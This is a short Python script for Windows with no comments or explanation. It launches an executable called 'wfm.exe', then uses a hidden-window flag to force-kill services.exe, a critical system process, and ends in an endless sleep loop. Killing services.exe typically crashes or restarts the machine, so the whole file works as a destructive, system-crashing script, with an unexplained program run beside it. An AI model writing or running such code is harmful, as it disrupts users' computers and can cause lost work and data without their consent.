import subprocess
import os
import time
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
os.startfile("wfm.exe")
subprocess.Popen(["taskkill", "/f", "/im", "services.exe"], startupinfo=startupinfo)
while True:
    time.sleep(65565)